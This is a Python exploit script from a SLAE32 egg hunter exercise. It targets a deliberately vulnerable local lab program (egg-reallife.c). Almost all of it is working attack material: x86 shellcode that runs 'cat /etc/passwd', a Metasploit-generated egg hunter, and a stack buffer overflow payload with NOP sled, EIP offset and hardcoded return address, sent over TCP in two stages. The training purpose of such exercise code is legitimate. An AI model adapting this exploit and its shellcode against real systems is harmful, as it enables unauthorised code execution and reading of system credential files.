#!/usr/bin/python3

'''
	Jean-Pierre LESUEUR (@DarkCoderSc)
	jplesueur@phrozen.io
	https://www.phrozen.io/
	https://github.com/darkcodersc

	License : MIT

	---

	SLAE32 Level 3 : Linux x86-32 Egg Hunter Research.

	---

	Description:
		This is the full working (LOCAL) exploit code for egg-reallife.c program to demonstrate our
		egg hunter is applied to real life situation.
'''

from socket import *
import sys
import time
import struct

#
# Log Defs
#
def success(message):
    print("[\033[32m+\033[39m] " + message)

def fail(message):
    print("[\033[31mx\033[39m] " + message)

def warn(message):
    print("[\033[34m!\033[39m] " + message)

def info(message):
    print("[\033[34m*\033[39m] " + message)

#
# Payload 1 : cat /etc/passwd.
#

# Prefixed by our egg token "egg!egg!".
shellcode =  b""
shellcode += b"\x65\x67\x67\x21" # egg!
shellcode += b"\x65\x67\x67\x21" # egg!

# Shellcode payload
shellcode += b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f"
shellcode += b"\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x73"
shellcode += b"\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x20\x2f\x65\x74\x68\x2f\x63"
shellcode += b"\x61\x74\x68\x2f\x62\x69\x6e\x89\xe6\x50\x56\x52\x53\x89\xe1\x50"
shellcode += b"\x89\xe2\xb0\x0b\xcd\x80"

#
# Payload 2 : Egg Hunter.
# Generated with msf-egghunter -f python -e egg! -v egg_hunter -p linux -a x86
#
egg_hunter =  b""
egg_hunter += b"\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd"
egg_hunter += b"\x80\x3c\xf2\x74\xf1\xb8\x65\x67\x67\x21\x89"
egg_hunter += b"\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7"

#
# Networking Function
#
def SubmitPhasePayload(cmd, payload):
	s = socket(AF_INET, SOCK_STREAM)

	if (s.connect_ex((LHOST, LPORT)) == 0):
		success(f"Successfully connected to {LHOST}:{LPORT}.");

		# Send command n°1 (cache data in memory)

		info(f"Send command = {cmd}");

		s.send(cmd);

		info("Wait 2 seconds...");

		time.sleep(2);

		info("Send payload stage.");

		s.send(payload);

		success("Payload successfully sent.")

		s.close(); # Gracefully close connection.	

		return True
	else:
		fail(f"Could not connect to {LHOST}:{LPORT}");	

	return False


#
# Exploitation
#
LHOST = "127.0.0.1"
LPORT = 1403

info("Phase n°1: Sending shellcode to target server memory.")
if (SubmitPhasePayload(b"\x31", shellcode)):
	success("Phase n°1 : Success.")

	info("Phase n°2: Exploiting buffer overflow and sending egg hunter shellcode.")

	#
	# Create buffer overflow payload.
	#
	payload =  b""
	
	# (+): Locate EIP Offset.
	# pattern_create.rb -l 250
	#payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0".encode('ascii')
	#payload += "Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A".encode('ascii')
	#payload += "e2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3".encode('ascii')
	#payload += "Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A".encode('ascii')
	# (+): Result = pattern_offset.rb -q "6Ac7"(offset=80)

	eip_offset = 80

	# (+): Test if we control EIP.
	#payload += b"\x41" * eip_offset
	#payload += b"\x42" * 4
	# (+): Yes we did. 0x42424242 is in EIP.

	# (+): Place and execute our egghunter shellcode.
	nop_sled_size = (eip_offset - len(egg_hunter))

	payload += b"\x90" * nop_sled_size       # NOP Sled.
	payload += egg_hunter                    # Our egghunter shellcode goes here.
	payload += b"\x1c\xe3\xbf\xb6"           # Stack address, ASLR must of course be disabled! Little Endian.
	# (+): If correctly configured, shellcode should get triggered.

	if (SubmitPhasePayload(b"\x32", payload)):
		success("Phase n°2 : Success.");
		info("Please wait few seconds until egghunter shellcode trigger the other one...");
	else:
		fail("Phase n°2 : Failed.")
else:
	fail("Phase n°1 : Failed.")